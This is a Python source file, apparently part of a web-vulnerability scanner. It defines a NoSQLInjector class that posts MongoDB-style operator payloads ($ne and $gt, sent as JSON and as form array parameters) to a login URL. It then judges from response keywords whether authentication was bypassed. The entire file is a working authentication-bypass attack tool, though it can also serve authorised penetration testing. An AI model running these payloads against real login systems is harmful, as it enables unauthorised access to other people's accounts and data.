import requests
from colorama import Fore
import json

class NoSQLInjector:
    def __init__(self, target_url):
        self.target_url = target_url
        # Common NoSQLi Payloads (MongoDB / CouchDB)
        # We target Authentication Bypass
        self.payloads_json = [
            {"data": {"username": {"$ne": None}, "password": {"$ne": None}}, "type": "NoSQLi (JSON $ne bypass)"},
            {"data": {"username": {"$gt": ""}, "password": {"$gt": ""}}, "type": "NoSQLi (JSON $gt bypass)"},
             {"data": {"username": "admin", "password": {"$ne": "1"}}, "type": "NoSQLi (JSON $ne bypass)"}
        ]
        
        # PHP/Express Array Style (param[$ne]=1)
        # Not easily map-able to 'data' dict directly without context of field names.
        # We'll assume standard 'username' / 'password' fields for now or accept them as args.

    def test_login(self, username_field="username", password_field="password"):
        """
        Tests a Login URL for NoSQL Injection.
        Args:
            username_field: Name of the user input field.
            password_field: Name of the password input field.
        """
        print(f"{Fore.CYAN}[*] Testing for NoSQL Injection on {self.target_url}...")
        findings = []

        # 1. JSON Injection (Content-Type: application/json)
        for payload in self.payloads_json:
             # Construct the specific JSON body based on field names
             # The payload['data'] keys need to match the actual form fields
             # If the payload uses generic 'username', we map it to username_field
             
             json_body = {}
             # Map keys
             for k, v in payload['data'].items():
                 if k == "username": json_body[username_field] = v
                 elif k == "password": json_body[password_field] = v
                 else: json_body[k] = v
            
             try:
                 # We send as JSON
                 res = requests.post(self.target_url, json=json_body, timeout=5, allow_redirects=True)
                 
                 if self._is_login_success(res):
                     print(f"{Fore.RED}[!!!] NoSQL Injection Found (JSON): {self.target_url}")
                     findings.append({
                         "type": payload['type'],
                         "payload": json.dumps(json_body),
                         "method": "POST (JSON)",
                         "details": f"Bypassed auth using JSON payload."
                     })
                     break # Stop if one bypass works
             except:
                 pass

        # 2. URL-Encoded Array Injection (application/x-www-form-urlencoded)
        # e.g. user[$ne]=null&pass[$ne]=null
        # This acts like a dictionary in backend (PHP/Express)
        
        payload_kv = {
            f"{username_field}[$ne]": "dummy",
            f"{password_field}[$ne]": "dummy"
        }
        
        try:
            res = requests.post(self.target_url, data=payload_kv, timeout=5, allow_redirects=True)
            if self._is_login_success(res):
                 print(f"{Fore.RED}[!!!] NoSQL Injection Found (Array): {self.target_url}")
                 findings.append({
                     "type": "NoSQLi (Array/Query Param)",
                     "payload": f"{username_field}[$ne]=dummy&{password_field}[$ne]=dummy",
                     "method": "POST (Form)",
                     "details": f"Bypassed auth using array parameter injection."
                 })
        except:
            pass

        return findings

    def _is_login_success(self, response):
        """
        Heuristic to determine if login was successful.
        """
        # 200 OK is common, but need to check content
        if response.status_code != 200 and response.status_code != 302:
            return False
            
        # Check for typical success indicators
        content = response.text.lower()
        success_keywords = ["welcome", "dashboard", "logout", "profile", "account", "admin"]
        failure_keywords = ["invalid", "incorrect", "fail", "error", "try again", "login"]
        
        # If redirect to dashboard (302)
        if len(response.history) > 0:
            if "login" not in response.url and "dashboard" in response.url:
                return True
        
        # If content has "Welcome" but NOT "Invalid"
        if any(k in content for k in success_keywords):
            if not any(f in content for f in failure_keywords):
                return True
                
        return False
